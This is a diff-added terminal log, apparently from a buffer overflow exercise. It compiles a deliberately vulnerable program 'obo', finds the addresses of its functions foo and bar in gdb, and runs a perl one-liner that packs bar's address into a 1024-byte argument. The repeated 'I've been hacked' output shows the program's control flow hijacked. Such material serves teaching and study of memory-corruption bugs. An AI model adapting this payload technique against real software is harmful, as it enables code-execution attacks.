@@ -1,0 +1,26 @@
+$ make
+gcc -g -mpreferred-stack-boundary=2 -march=i386 -o obo obo.c
+$ gdb -q obo
+Reading symbols from obo...done.
+(gdb) b main
+Breakpoint 1 at 0x804844d: file obo.c, line 26.
+(gdb) r
+Starting program: /home/lain/cvuln/off-by-one/obo 
+
+Breakpoint 1, main (argc=1, argv=0xbffff504) at obo.c:26
+26	  if (argc != 2) {
+(gdb) p foo
+$1 = {void (char *)} 0x8048412 <foo>
+(gdb) p bar
+$2 = {void (void)} 0x8048438 <bar>
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 2401] will be killed.
+
+Quit anyway? (y or n) y
+$ perl -e '$arg = pack(A1024, "\x38\x84\x04\x08"x256); system "./obo", $arg'
+I've been hacked
+I've been hacked
+I've been hacked
+[...]
